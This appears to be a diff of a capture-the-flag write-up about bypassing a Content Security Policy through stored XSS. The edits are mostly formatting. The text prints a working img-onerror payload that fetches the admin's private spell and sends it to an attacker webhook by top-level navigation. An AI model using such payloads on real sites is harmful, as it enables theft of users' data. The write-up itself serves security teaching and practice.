@@ -120,10 +120,10 @@ Our onerror handler is able to run (script-src) and we *can* fetch the flag spel
 However, we can't fetch out to our webhook. And img-src 'self' stops ``new Image().src`` shenanigans.
 Also, the JWT cookie is httponly, so we can't just steal the admin's cookie and log in ourselves.
 
-Okay, what isn't in this CSP? Top-level navigation. So, something like ``location = '//myhook/?a=' + flag`` would be allowed!
+Okay, what isn't in this CSP? Top-level navigation. So, something like ``location='https://myhook/?a=' + flag`` would be allowed!
 
 Let's try and build this payload.
-Start with ``<img src = x onerror=``, and we need to fetch the admin's spell list.
+Start with ``<img src=x onerror=``, and we need to fetch the admin's spell list.
 So, let's add ``fetch('/spells').then(r=>r.text())``
 Then, we need to get the first spell, and the id needs to be found dynamically.
 To get it, we can use DOMParser to parse the spellbook HTML into a DOM, and we can querySelector the spell link out of it, then turn the response into the actual HTML text:
@@ -133,18 +133,18 @@ To get it, we can use DOMParser to parse the spellbook HTML into a DOM, and we c
     ".then(r=>r.text())"
  ```
 Finally, we can exfil to our webhook with the aforementioned top-level navigation:
-```
-f".then(f=>location='{myhook}/?d='+encodeURIComponent(f))\">")
+```python
+f".then(f=>location='{myhook}/?a='+encodeURIComponent(f))\">")
 ```
 
 This all comes out to this payload:
-```py
+```python
 "<img src=x onerror=\""
 "fetch('/spells').then(r=>r.text())"
 ".then(t=>fetch(new DOMParser().parseFromString(t,'text/html')"
 ".querySelector('a[href^=/spells/]').href))"
 ".then(r=>r.text())"
-f".then(f=>location='{myhook}/?d='+encodeURIComponent(f))\">")
+f".then(f=>location='{myhook}/?a='+encodeURIComponent(f))\">")
 ```
 
 Make a spell with that as the incantation, report it to admin, and...
